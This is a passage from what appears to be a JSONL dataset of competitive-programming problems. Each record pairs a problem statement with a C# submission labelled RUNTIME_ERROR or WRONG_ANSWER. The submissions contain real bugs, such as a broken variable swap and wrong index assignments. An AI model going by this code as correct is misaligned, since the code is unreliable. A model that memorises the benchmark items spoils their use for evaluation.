\u2014 the number of days after which the i-th tile gets destroyed (1\u2009\u2264\u2009ai\u2009\u2264\u2009103). ","output_spec":"Print a single number \u2014 the sought number of days.","notes":"NoteIn the first sample the second tile gets destroyed after day three, and the only path left is 1\u2009\u2192\u20093\u2009\u2192\u20094. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.In the second sample path 1\u2009\u2192\u20093\u2009\u2192\u20095 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.","sample_inputs":["4\n10 3 5 10","5\n10 2 8 3 5"],"sample_outputs":["5","5"]}
{"difficulty":1200,"lang":"MS C#","lang_cluster":"c#","src_uid":"d90da1e932a6aa546bec4e1bd4b1fbec","submission_id":"re_49","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.IO;\nusing System.Linq;\n\nnamespace CF317\n{\n\tinternal class Program\n\t{\n\t\tprivate static void Main(string[] args)\n\t\t{\n\t\t\tvar sr = new InputReader(Console.In);\n\t\t\t\/\/var sr = new InputReader(new StreamReader(\"input.txt\"));\n\t\t\tvar task = new Task();\n\t\t\tusing (var sw = Console.Out)\n\t\t\t\t\/\/using (var sw = new StreamWriter(\"output.txt\"))\n\t\t\t{\n\t\t\t\ttask.Solve(sr, sw);\n\t\t\t\t\/\/Console.ReadKey();\n\t\t\t}\n\t\t}\n\t}\n\n\tinternal class Task\n\t{\n\t\tpublic void Solve(InputReader sr, TextWriter sw)\n\t\t{\n\t\t\tvar input = sr.ReadArray(Int32.Parse);\n\t\t\tvar n = input[0];\n\t\t\tvar m = input[1];\n\t\t\tvar costs = sr.ReadArray(Int32.Parse);\n\t\t\tvar dict = new Dictionary<int, HashSet<int>>();\n\t\t\tfor (var i = 0; i < m; i++) {\n\t\t\t\tinput = sr.ReadArray(Int32.Parse);\n\t\t\t\tif (!dict.ContainsKey(input[0])) {\n\t\t\t\t\tdict.Add(input[0], new HashSet<int>());\n\t\t\t\t}\n\t\t\t\tdict[input[0]].Add(input[1]);\n\t\t\t\tif (!dict.ContainsKey(input[1])) {\n\t\t\t\t\tdict.Add(input[1], new HashSet<int>());\n\t\t\t\t}\n\t\t\t\tdict[input[1]].Add(input[0]);\n\t\t\t}\n\t\t\tvar maxCost = -1;\n\t\t\tfor (var i = 1; i <= n; i++) {\n\t\t\t\tfor (var j = 1; j <= n; j++) {\n\t\t\t\t\tif (dict.ContainsKey(i) && dict[i].Contains(j)) {\n\t\t\t\t\t\tfor (var k = 1; k <= n; k++) {\n\t\t\t\t\t\t\tif (i != j && i != k && j != k) {\n\t\t\t\t\t\t\t\tif (dict[i].Contains(k) && dict[j].Contains(k)) {\n\t\t\t\t\t\t\t\t\tvar curr = costs[i - 1] + costs[j - 1] + costs[k - 1];\n\t\t\t\t\t\t\t\t\tif (curr > maxCost) {\n\t\t\t\t\t\t\t\t\t\tmaxCost = curr;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tsw.WriteLine(maxCost);\n\t\t}\n\t}\n}\n\ninternal class InputReader : IDisposable\n{\n\tprivate bool isDispose;\n\tprivate readonly TextReader sr;\n\n\tpublic InputReader(TextReader stream)\n\t{\n\t\tsr = stream;\n\t}\n\n\tpublic void Dispose()\n\t{\n\t\tDispose(true);\n\t\tGC.SuppressFinalize(this);\n\t}\n\n\tpublic string NextString()\n\t{\n\t\tvar result = sr.ReadLine();\n\t\treturn result;\n\t}\n\n\tpublic int NextInt32()\n\t{\n\t\treturn Int32.Parse(NextString());\n\t}\n\n\tpublic long NextInt64()\n\t{\n\t\treturn Int64.Parse(NextString());\n\t}\n\n\tpublic string[] NextSplitStrings()\n\t{\n\t\treturn NextString()\n\t\t\t.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n\t}\n\n\tpublic T[] ReadArray<T>(Func<string, CultureInfo, T> func)\n\t{\n\t\treturn NextSplitStrings()\n\t\t\t.Select(s => func(s, CultureInfo.InvariantCulture))\n\t\t\t.ToArray();\n\t}\n\n\tpublic T[] ReadArrayFromString<T>(Func<string, CultureInfo, T> func, string str)\n\t{\n\t\treturn\n\t\t\tstr.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries)\n\t\t\t\t.Select(s => func(s, CultureInfo.InvariantCulture))\n\t\t\t\t.ToArray();\n\t}\n\n\tprotected void Dispose(bool dispose)\n\t{\n\t\tif (!isDispose) {\n\t\t\tif (dispose)\n\t\t\t\tsr.Close();\n\t\t\tisDispose = true;\n\t\t}\n\t}\n\n\t~InputReader()\n\t{\n\t\tDispose(false);\n\t}\n}","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items (). Next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the prices of the clothing items in rubles. Next m lines each contain a pair of space-separated integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,\u2009vi) are different.","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).","notes":"NoteIn the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.The second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.In the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1","3 2\n2 3 4\n2 3\n2 1","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1"],"sample_outputs":["6","-1","-1"]}
{"difficulty":800,"lang":"Mono C#","lang_cluster":"c#","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_756","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nnamespace _34A\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = Convert.ToInt32(Console.ReadLine());\n            int[] container = Console.ReadLine().Split().Select(int.Parse).ToArray();\n            int helper = 0,ans=999999;\n            int index1 = 0, index2 = 0;\n            for(int i=1;i<n;i++)\n            {\n                helper = Math.Abs(container[i] - container[i - 1]);\n                if (helper<ans)\n                {\n                    ans = helper;\n                    index1 = i;\n                    index2 = i - 1;\n                }\n            }\n            int final = Math.Abs(container[0] - container[n - 1]);\n            if(final<ans)\n            {\n                index1 = 1;\n                index2 = n - 1;\n            }\n           \n            Console.WriteLine(\"{0} {1}\", index1+1, index2+1);\n        }\n    }\n}\n","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":2100,"lang":"Mono C#","lang_cluster":"c#","src_uid":"05f251de93536024c05fbd77ed01b70b","submission_id":"re_1398","tags":["dsu","number theory","dfs and similar","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace ConsoleApplication3\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string s1 = Console.ReadLine();\n\n            int n = int.Parse(s1.Split(' ')[0]) - 1;\n            int m = int.Parse(s1.Split(' ')[1]) - 1;\n\n            int min = m;\n\n            if (n < m)\n            {\n                min = n;\n                n = m;\n                m = min;\n            }\n\n            byte[] poss = new byte[min + 1];\n\n            for (int i = 0; i < poss.Length; i++)\n                poss[i] = 1;\n\n            for (int i = 0; i <= min; i++)\n            {\n                if (poss[i] == 1)\n                {\n                    int y = i;\n                    int dy = 2 * n % (2 * m);\n\n                    do\n                    {\n                        y += dy;\n                        dy *= Convert.ToInt32(Math.Pow((-1.0), Convert.ToDouble(((y - 1) \/ m) % 2)));\n                        y = (Math.Abs(y) \/ m) % 2 * m + Convert.ToInt32(Math.Pow((-1.0), Convert.ToDouble(((Math.Abs(y) - 1) \/ m) % 2))) * Math.Abs(y % m);\n                        \/\/dy *= Convert.ToInt32(Math.Pow((-1.0), Convert.ToDouble(((y - 1) \/ m) % 2 - 1)));\n                        if (poss[y] == 1 && y != i)\n                            poss[y] = 0;\n                    } while (y != i);\n                }\n            }\n\n            int cou = 0;\n\n            for (int i = 0; i < poss.Length; i++)\n                if (poss[i] == 1)\n                    cou++;\n\n            Console.WriteLine(cou.ToString());\n\n            Console.ReadKey();\n        }\n\n    }\n}\n    \n","description":"Let's imagine: there is a chess piece billiard ball. Its movements resemble the ones of a bishop chess piece. The only difference is that when a billiard ball hits the board's border, it can reflect from it and continue moving.More formally, first one of four diagonal directions is chosen and the billiard ball moves in that direction. When it reaches the square located on the board's edge, the billiard ball reflects from it; it changes the direction of its movement by 90 degrees and continues moving. Specifically, having reached a corner square, the billiard ball is reflected twice and starts to move the opposite way. While it moves, the billiard ball can make an infinite number of reflections. At any square of its trajectory the billiard ball can stop and on that the move is considered completed.  It is considered that one billiard ball a beats another billiard ball b if a can reach a point where b is located.You are suggested to find the maximal number of billiard balls, that pairwise do not beat each other and that can be positioned on a chessboard n\u2009\u00d7\u2009m in size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (2\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009106).","output_spec":"Print a single number, the maximum possible number of billiard balls that do not pairwise beat each other. Please do not use the %lld specificator to read or write 64-bit numbers in C++. It is preferred to use cin (also you may use the %I64d specificator).","notes":null,"sample_inputs":["3 4","3 3"],"sample_outputs":["2","3"]}
{"difficulty":2400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"0f49b4a5696ee71ebbc8f83d1ec3b901","submission_id":"re_646","tags":["number theory","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\n\npublic class Program {\n    private int n;\n    private int[] numbers;\n\n    public void Solve() {\n        string[] data;\n        data = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        n = int.Parse(data[1]);\n        data = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        numbers = new int[data.Length];\n        for (int i = 0; i < n; ++i)\n            numbers[i] = int.Parse(data[i]);\n        Console.WriteLine(computeMinCost());\n    }\n\n    private int computeMinCost() {\n        Array.Sort(numbers);\n        if (numbers.Length > 0 && numbers[0] == 1)\n            return 1;\n        else if (n >= limit)\n            return -1;\n        int cost = 0, index = 0;\n        foreach (int prime in primes) {\n            if (prime >= n)\n                break;\n            while (index < numbers.Length && numbers[index] < prime)\n                ++index;\n            if (index == numbers.Length || numbers[index] != prime)\n                return -1;\n            ++cost;\n        }\n        return cost;\n    }\n\n    private static int limit = 1299744;\n    private static bool[] isPrime;\n    private static List<int> primes;\n\n    private static void computePrimes() {\n        isPrime = new bool[limit];\n        for (int i = 2; i < limit; ++i)\n            isPrime[i] = true;\n        primes = new List<int>();\n        for (int i = 2; i < limit; ++i) {\n            if (isPrime[i])\n                primes.Add(i);\n            foreach (int prime in primes) {\n                if (i * prime >= limit)\n                    break;\n                isPrime[i * prime] = false;\n                if (i % prime == 0)\n                    break;\n            }\n        }\n    }\n\n    public static void Main() {\n        computePrimes();\n        new Program().Solve();\n    }\n}\n","description":"Vasya plays The Elder Trolls III: Morrowindows. He has a huge list of items in the inventory, however, there is no limits on the size of things. Vasya does not know the total amount of items but he is sure that are not more than x and not less than 2 items in his inventory. A new patch for the game appeared to view inventory in n different modes. Displaying in mode i is a partition of all inventory items on pages, each of which (except for maybe the last one) shows exactly ai items. In addition, each mode shows how many pages bi is in a complete list. Great! Perhaps this information will be enough for Vasya to find the required number. Moreover, it is very interesting, what is the fewest number of modes in which Vasya can see inventory to determine the number of items in it?Vasya cannot use the information that was received while looking on inventory in some mode for selection of next actions. I. e. Vasya chooses some set of modes first, and then sees all the results and determines the size.Knowing the number of ai, x and assuming that Vasya is very smart, check whether he can uniquely determine the number of items in his inventory, and how many modes he will need to do that if he knows numbers ai, x and he is able to know number bi after viewing items in mode i.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and x (0\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20092\u2009\u2264\u2009x\u2009\u2264\u2009109). The second line contains integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009109). Some numbers among all ai may be equal.","output_spec":"Output the fewest amount of modes required to uniquely determine amount of items in the inventory. If there is no solution output \u2009-\u20091.","notes":"NoteIn the second example Vasya is not able to determine items count uniquely because 3 items, as well as 4 items, can be displayed on two pages.","sample_inputs":["2 4\n2 3","1 4\n2"],"sample_outputs":["2","-1"]}
{"difficulty":2000,"lang":"Mono C#","lang_cluster":"c#","src_uid":"13fa378c913bb7a15612327099b59f83","submission_id":"re_634","tags":["dp","greedy","math","implementation","data structures","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Text;\n\nnamespace D\n{\n    class Program\n    {\n        class AR\n        {\n            public long max, sum, maxl, maxr;\n        }\n\n        static void Main(string[] args)\n        {\n            string[] line = Console.ReadLine().Split(' ');\n            int n = int.Parse(line[0]);\n            int m = int.Parse(line[1]);\n\n            AR[] ar = new AR[n];\n\n            for (int i = 0; i < n; i++)\n            {\n                line = Console.ReadLine().Split(' ');\n                int size = int.Parse(line[0]);\n                int[] a = new int[size];\n                for (int j = 0; j < size; j++)\n                    a[j] = int.Parse(line[j + 1]);\n\n                ar[i] = new AR();\n\n                \/\/\/\/ max\n                \/\/long max = int.MinValue;\n                \/\/for (int j = 0; j < size; j++)\n                \/\/    max = Math.Max(max, a[j]);\n                \/\/ar[i].max = max;\n\n                long sum = 0;\n                for (int j = 0; j < size; j++)\n                    sum += a[j];\n                ar[i].sum = sum;\n\n\n                int p = 0;\n                long max = long.MinValue;\n\n                while (p < size && a[p] < 0)\n                    p++;\n\n                if (p == size)\n                {\n                    for (int j = 0; j < size; j++)\n                        max = Math.Max(max, a[j]);\n                    ar[i].max = max;\n                }\n                else\n                {\n                    long cs = max = a[p];\n                    for (int q = p + 1; q < size; q++)\n                    {\n                        if (a[q] + cs > 0)\n                        {\n                            cs += a[q];\n                            max = Math.Max(max, cs);\n                        }\n                        else\n                            cs = 0;\n                    }\n                    ar[i].max = max;\n                }\n\n                long maxl = 0, suml = 0;\n                for (int j = 0; j < size; j++)\n                {\n                    suml += a[j];\n                    maxl = Math.Max(maxl, suml);\n                }\n\n                long maxr = 0, sumr = 0;\n                for (int j = size - 1; j >= 0; j--)\n                {\n                    sumr += a[j];\n                    maxr = Math.Max(maxr, sumr);\n                }\n\n                ar[i].maxl = maxl;\n                ar[i].maxr = maxr;\n            }\n\n            int[] lg = Array.ConvertAll(Console.ReadLine().Split(' '), int.Parse);\n\n            long[] DPe = new long[m + 1];\n            long[] DPc = new long[m + 1];\n            long[] DPs = new long[m + 1];\n\n            DPe[0] = long.MinValue;\n            DPc[0] = long.MinValue;\n            DPs[0] = ar[lg[0] - 1].maxr;\n\n            for (int i = 1; i < m; i++)\n            {\n                int idx = lg[i] - 1;\n                if (i > 1)\n                {\n                    DPe[i] = Math.Max(DPc[i - 1], DPs[i - 1]) + ar[idx].maxl;\n                    DPc[i] = Math.Max(DPc[i - 1], DPs[i - 1]) + ar[idx].sum;\n                }\n                else\n                {\n                    DPe[i] = DPs[i - 1] + ar[idx].maxl;\n                    DPc[i] = DPs[i - 1] + ar[idx].sum;\n                }\n                DPs[i] = ar[idx].maxr;\n            }\n\n            long best = long.MinValue;\n            for (int i = 0; i < m; i++)\n                best = Math.Max(best, ar[lg[i] - 1].max);\n\n            \/\/best = Math.Max(best, ar[lg[0] - 1].maxr);\n\n            for (int i = 1; i < m; i++)\n            {\n                best = Math.Max(best, DPe[i]);\n                \/\/best = Math.Max(best, DPc[i]);\n                \/\/best = Math.Max(best, DPs[i]);\n            }\n\n            Console.WriteLine(best);\n\n        }\n    }\n}\n","description":"Ahmed and Mostafa used to compete together in many programming contests for several years. Their coach Fegla asked them to solve one challenging problem, of course Ahmed was able to solve it but Mostafa couldn't.This problem is similar to a standard problem but it has a different format and constraints.In the standard problem you are given an array of integers, and you have to find one or more consecutive elements in this array where their sum is the maximum possible sum.But in this problem you are given n small arrays, and you will create one big array from the concatenation of one or more instances of the small arrays (each small array could occur more than once). The big array will be given as an array of indexes (1-based) of the small arrays, and the concatenation should be done in the same order as in this array. Then you should apply the standard problem mentioned above on the resulting big array.For example let's suppose that the small arrays are {1, 6, -2}, {3, 3} and {-5, 1}. And the indexes in the big array are {2, 3, 1, 3}. So the actual values in the big array after formatting it as concatenation of the small arrays will be {3, 3, -5, 1, 1, 6, -2, -5, 1}. In this example the maximum sum is 9.Can you help Mostafa solve this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m, n is the number of the small arrays (1\u2009\u2264\u2009n\u2009\u2264\u200950), and m is the number of indexes in the big array (1\u2009\u2264\u2009m\u2009\u2264\u2009250000). Then follow n lines, the i-th line starts with one integer l which is the size of the i-th array (1\u2009\u2264\u2009l\u2009\u2264\u20095000), followed by l integers each one will be greater than or equal -1000 and less than or equal 1000. The last line contains m integers which are the indexes in the big array, and you should concatenate the small arrays in the same order, and each index will be greater than or equal to 1 and less than or equal to n. The small arrays are numbered from 1 to n in the same order as given in the input. Some of the given small arrays may not be used in big array. Note, that the array is very big. So if you try to build it straightforwardly, you will probably get time or\/and memory limit exceeded.","output_spec":"Print one line containing the maximum sum in the big array after formatting it as described above. You must choose at least one element for the sum, i. e. it cannot be empty. Please, do not use %lld specificator to write 64-bit integers in C++. It is preferred to use cout (also you may use %I64d).","notes":null,"sample_inputs":["3 4\n3 1 6 -2\n2 3 3\n2 -5 1\n2 3 1 3","6 1\n4 0 8 -3 -10\n8 3 -2 -5 10 8 -9 -5 -4\n1 0\n1 -3\n3 -8 5 6\n2 9 6\n1"],"sample_outputs":["9","8"]}
{"difficulty":2500,"lang":"Mono C#","lang_cluster":"c#","src_uid":"1503f0379bf8d7f25c191ddea9278842","submission_id":"re_1100","tags":["geometry"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.IO;\n\nnamespace pro\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = int.Parse(Console.ReadLine());\n            int[] x = new int[n];\n            int[] y = new int[n];\n            for (int i = 0; i < n; i++)\n            {\n                string[] sp = Console.ReadLine().Split();\n                x[i] = int.Parse(sp[0]);\n                y[i] = int.Parse(sp[1]);\n            }\n            Int64 L = x[0], R = x[1];\n            if (L > R)\n            {\n                Int64 tmp = L;\n                L = R;\n                R = L;\n            }\n            for (int i = 0; i < n; i++)\n            {\n                int j = (i + 1) % n;\n                Int64 a = y[j] - y[i];\n                Int64 b = x[i] - x[j];\n                Int64 c = - a * x[i] - b * y[i];\n                if (a == 0)\n                {\n                    if (i != 0 && b * (x[0] - x[1]) > 0)\n                    {\n                        L = R + 1;\n                        break;\n                    }\n                    continue;\n                }\n                double loc = ((double)-b * y[1] - c) \/ a;\n                \/\/Console.WriteLine(\"i = \" + i + \" loc = \" + loc + \" a = \" + a);\n                if (a > 0)\n                {\n                    Int64 v = (Int64)(loc + 1 - 1e-7);\n                    if (L < v) L = v;\n                }else\n                {\n                    Int64 v = (Int64)(loc + 1e-7);\n                    if (R > v) R = v;\n                }\n            }\n            Console.WriteLine(R - L + 1);\n        }\n    }\n}\n","description":"In the town of Aalam-Aara (meaning the Light of the Earth), previously there was no crime, no criminals but as the time progressed, sins started creeping into the hearts of once righteous people. Seeking solution to the problem, some of the elders found that as long as the corrupted part of population was kept away from the uncorrupted part, the crimes could be stopped. So, they are trying to set up a compound where they can keep the corrupted people. To ensure that the criminals don't escape the compound, a watchtower needs to be set up, so that they can be watched.Since the people of Aalam-Aara aren't very rich, they met up with a merchant from some rich town who agreed to sell them a land-plot which has already a straight line fence AB along which a few points are set up where they can put up a watchtower. Your task is to help them find out the number of points on that fence where the tower can be put up, so that all the criminals can be watched from there. Only one watchtower can be set up. A criminal is watchable from the watchtower if the line of visibility from the watchtower to him doesn't cross the plot-edges at any point between him and the tower i.e. as shown in figure 1 below, points X, Y, C and A are visible from point B but the points E and D are not.    Figure 1     Figure 2 Assume that the land plot is in the shape of a polygon and coordinate axes have been setup such that the fence AB is parallel to x-axis and the points where the watchtower can be set up are the integer points on the line. For example, in given figure 2, watchtower can be setup on any of five integer points on AB i.e. (4,\u20098), (5,\u20098), (6,\u20098), (7,\u20098) or (8,\u20098). You can assume that no three consecutive points are collinear and all the corner points other than A and B, lie towards same side of fence AB. The given polygon doesn't contain self-intersections.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the test case will consist of the number of vertices n (3\u2009\u2264\u2009n\u2009\u2264\u20091000). Next n lines will contain the coordinates of the vertices in the clockwise order of the polygon. On the i-th line are integers xi and yi (0\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009106) separated by a space. The endpoints of the fence AB are the first two points, (x1,\u2009y1) and (x2,\u2009y2).","output_spec":"Output consists of a single line containing the number of points where the watchtower can be set up.","notes":"NoteFigure 2 shows the first test case. All the points in the figure are watchable from any point on fence AB. Since, AB has 5 integer coordinates, so answer is 5.For case two, fence CD and DE are not completely visible, thus answer is 0.","sample_inputs":["5\n4 8\n8 8\n9 4\n4 0\n0 4","5\n4 8\n5 8\n5 4\n7 4\n2 2"],"sample_outputs":["5","0"]}
{"difficulty":2000,"lang":"MS C#","lang_cluster":"c#","src_uid":"1daa784c0eb1cde514e4319da07c8d00","submission_id":"4f27873fb6edb9f4f5f5b70930b18411","tags":["constructive algorithms","graphs","math"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.IO;\nusing System.Linq;\n\nclass ProblemC {\n    static string inputFileName = \"..\/..\/input.txt\";\n    static StreamReader fileReader;\n    static string[] inputTokens;\n    static int curInputTokenIndex;\n    static string NextToken() {\n        string ret = \"\";\n        while (ret == \"\") {\n            if (inputTokens == null || curInputTokenIndex >= inputTokens.Length) {\n                string line;\n                if (Type.GetType(\"HaitaoLocal\") != null) {\n                    if (fileReader == null) {\n                        fileReader = new StreamReader(inputFileName);\n                    }\n                    line = fileReader.ReadLine();\n                    if (line == null) {\n                        throw new Exception(\"Error: out of input tokens!\");\n                    }\n                } else {\n                    line = Console.ReadLine();\n                }\n                inputTokens = line.Split();\n                curInputTokenIndex = 0;\n            }\n            ret = inputTokens[curInputTokenIndex++];\n        }\n        return ret;\n    }\n    static int ReadInt() {\n        return Int32.Parse(NextToken());\n    }\n    static string ReadString() {\n        return NextToken();\n    }\n    static long ReadLong() {\n        return Int64.Parse(NextToken());\n    }\n    static int[] ReadIntArray(int length) {\n        int[] ret = new int[length];\n        for (int i = 0; i < length; i++) {\n            ret[i] = ReadInt();\n        }\n        return ret;\n    }\n    static string[] ReadStringArray(int length) {\n        string[] ret = new string[length];\n        for (int i = 0; i < length; i++) {\n            ret[i] = ReadString();\n        }\n        return ret;\n    }\n    static long[] ReadLongArray(int length) {\n        long[] ret = new long[length];\n        for (int i = 0; i < length; i++) {\n            ret[i] = ReadLong();\n        }\n        return ret;\n    }\n    static string DoubleToString(double d) {\n        return d.ToString(new CultureInfo(\"en-US\"));\n    }\n\n    public static void Main(string[] args) {\n\n        int N = ReadInt();\n        int[] ar = ReadIntArray(N);\n        for (int i = 0; i < N; i++) ar[i]--;\n        int[,] dp = new int[2*N+1,N];\n        for(int k=0; k<=2*N; k++) {\n            for(int i=0; i<N; i++) {\n                if (k == 0) dp[k, i] = 1;\n                else if (k == 1) dp[k, i] = ar[i];\n                else dp[k, i] = ar[dp[k - 1, i]];\n            }\n        }\n\n        int ans = 0;\n        for (int k = 1; k <= N; k++) {\n            bool flag = true;\n            for (int i = 0; i < N; i++) {\n                if (dp[2 * k, i] != dp[k, i]) flag = false;\n            }\n            if (flag) {ans = k; break;}\n        }\n\n            Console.WriteLine(ans);\n\n    }\n}\n","description":"Some time ago Leonid have known about idempotent functions. Idempotent function defined on a set {1,\u20092,\u2009...,\u2009n} is such function , that for any  the formula g(g(x))\u2009=\u2009g(x) holds.Let's denote as f(k)(x) the function f applied k times to the value x. More formally, f(1)(x)\u2009=\u2009f(x), f(k)(x)\u2009=\u2009f(f(k\u2009-\u20091)(x)) for each k\u2009&gt;\u20091.You are given some function . Your task is to find minimum positive integer k such that function f(k)(x) is idempotent.","input_from":"standard input","output_to":"standard output","input_spec":"In the first line of the input there is a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009200) \u2014 the size of function f domain. In the second line follow f(1),\u2009f(2),\u2009...,\u2009f(n) (1\u2009\u2264\u2009f(i)\u2009\u2264\u2009n for each 1\u2009\u2264\u2009i\u2009\u2264\u2009n), the values of a function.","output_spec":"Output minimum k such that function f(k)(x) is idempotent.","notes":"NoteIn the first sample test function f(x)\u2009=\u2009f(1)(x) is already idempotent since f(f(1))\u2009=\u2009f(1)\u2009=\u20091, f(f(2))\u2009=\u2009f(2)\u2009=\u20092, f(f(3))\u2009=\u2009f(3)\u2009=\u20092, f(f(4))\u2009=\u2009f(4)\u2009=\u20094.In the second sample test:   function f(x)\u2009=\u2009f(1)(x) isn't idempotent because f(f(1))\u2009=\u20093 but f(1)\u2009=\u20092;  function f(x)\u2009=\u2009f(2)(x) is idempotent since for any x it is true that f(2)(x)\u2009=\u20093, so it is also true that f(2)(f(2)(x))\u2009=\u20093. In the third sample test:   function f(x)\u2009=\u2009f(1)(x) isn't idempotent because f(f(1))\u2009=\u20093 but f(1)\u2009=\u20092;  function f(f(x))\u2009=\u2009f(2)(x) isn't idempotent because f(2)(f(2)(1))\u2009=\u20092 but f(2)(1)\u2009=\u20093;  function f(f(f(x)))\u2009=\u2009f(3)(x) is idempotent since it is identity function: f(3)(x)\u2009=\u2009x for any  meaning that the formula f(3)(f(3)(x))\u2009=\u2009f(3)(x) also holds. ","sample_inputs":["4\n1 2 2 4","3\n2 3 3","3\n2 3 1"],"sample_outputs":["1","2","3"]}
{"difficulty":2000,"lang":"MS C#","lang_cluster":"c#","src_uid":"31be4d38a8b5ea8738a65bfee24a5a21","submission_id":"71f588e4ff686083d763015db7575d93","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeff#if DEBUG\nusing System.Reflection;\nusing System.Threading.Tasks;\n#endif\n\nusing System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\nusing System.Numerics;\nusing System.Globalization;\n\n\nnamespace _347c\n{\n    class Program\n    {\n        static string _inputFilename = \"input.txt\";\n        static string _outputFilename = \"output.txt\";\n        static bool _useFileInput = false;\n\n\n        static void Main(string[] args)\n        {\n            StreamWriter file = null;\n#if DEBUG\n\t\t\tConsole.SetIn(getInput());\n#else\n            if (_useFileInput)\n            {\n                Console.SetIn(File.OpenText(_inputFilename));\n                file = new StreamWriter(_outputFilename);\n                Console.SetOut(file);\n            }\n#endif\n\n            try\n            {\n                solution();\n            }\n            finally\n            {\n                if (_useFileInput)\n                {\n                    file.Close();\n                }\n            }\n        }\n\n        static void solution()\n        {\n            #region SOLUTION\n            var n = readInt();\n            for (int i = 0; i < n; i++)\n            {\n                var next = Console.ReadLine().Split('\\'').ToArray();\n                var val = next[1];\n                if (val.Length == 1)\n                {\n                    var d = int.Parse(val);\n                    if (d == 9)\n                    {\n                        Console.WriteLine(1989);\n                    }\n                    else\n                    {\n                        Console.WriteLine(\"199{0}\", val);\n                    }\n                }\n                else if (val == \"99\")\n                {\n                    Console.WriteLine(\"1999\");\n                }\n                else if (val.Length == 2)\n                {\n                    Console.WriteLine(\"20{0}\", val);\n                }\n                else if (val.Length == 3)\n                {\n                    Console.WriteLine(\"2{0}\", val);\n                }\n                else\n                {\n                    var last = val.Substring(val.Length - 4, 4);\n                    var dc = int.Parse(last);\n                    if (dc >= 1000 && dc <= 2999)\n                    {\n                        var si = true;\n                        var any = false;\n                        for (int j = 0; j < val.Length - 4; j++)\n                        {\n                            any = true;\n                            if (val[j] != '1')\n                            {\n                                si = false;\n                            }\n                        }\n\n                        if (si || !any)\n                        {\n                            